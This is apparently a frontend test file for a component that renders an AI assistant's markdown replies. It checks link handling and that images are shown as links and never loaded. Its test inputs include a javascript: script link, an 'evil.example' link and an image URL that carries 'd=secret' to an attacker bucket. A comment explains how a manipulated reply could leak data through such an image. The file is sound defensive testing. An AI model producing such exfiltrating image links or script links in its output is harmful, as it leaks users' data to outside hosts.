import { cleanup, render, screen } from "@testing-library/react";
import { MemoryRouter } from "react-router";
import { afterEach, describe, expect, it } from "vitest";
import { AiMarkdown } from "../ai-markdown";

afterEach(cleanup);

function renderReply(content: string, inRouter = true) {
  const reply = <AiMarkdown content={content} />;
  render(inRouter ? <MemoryRouter>{reply}</MemoryRouter> : reply);
}

describe("links in a reply", () => {
  // A page of the app opens in place, keeping the person's session and the
  // assistant open beside it, rather than in a second copy of the app.
  it("opens a page of the app in place", () => {
    renderReply("Open [Rate matrices](/billing/configuration-files/rate-matrices).");

    const link = screen.getByRole("link", { name: "Rate matrices" });
    expect(link).toHaveAttribute("href", "/billing/configuration-files/rate-matrices");
    expect(link).not.toHaveAttribute("target");
  });

  it("opens another site in a new tab, without handing it this window", () => {
    renderReply("See [the FMCSA](https://www.fmcsa.dot.gov/).");

    const link = screen.getByRole("link", { name: "the FMCSA" });
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });

  it("treats a protocol-relative link as another site", () => {
    renderReply("[Elsewhere](//evil.example/x)");

    expect(screen.getByRole("link", { name: "Elsewhere" })).toHaveAttribute("target", "_blank");
  });

  it("never renders a script link", () => {
    renderReply("[Click](javascript:alert(1))");

    const link = screen.queryByRole("link", { name: "Click" });
    expect(link?.getAttribute("href") ?? "").not.toContain("javascript:");
  });

  // Replies are rendered in places with no router too; a page link there is
  // an ordinary link rather than a crash.
  it("falls back to a plain link outside the router", () => {
    renderReply("Open [Invoices](/billing/invoices).", false);

    expect(screen.getByRole("link", { name: "Invoices" })).toHaveAttribute(
      "href",
      "/billing/invoices",
    );
  });
});

describe("images in a reply", () => {
  // An image loads the moment it renders. A reply talked into embedding one
  // would send whatever it put in the address to that host, unclicked.
  it("never loads an image, and offers it as a link to open deliberately", () => {
    const { container } = render(
      <MemoryRouter>
        <AiMarkdown content="![rates](https://storage.googleapis.com/evil/x.png?d=secret)" />
      </MemoryRouter>,
    );

    expect(container.querySelector("img")).toBeNull();
    const link = screen.getByRole("link", { name: "rates" });
    expect(link).toHaveAttribute("href", "https://storage.googleapis.com/evil/x.png?d=secret");
    expect(link).toHaveAttribute("target", "_blank");
  });

  it("names an image with no description rather than drawing nothing", () => {
    const { container } = render(
      <MemoryRouter>
        <AiMarkdown content="![](https://example.com/a.png)" />
      </MemoryRouter>,
    );

    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByRole("link", { name: "image" })).toBeInTheDocument();
  });
});
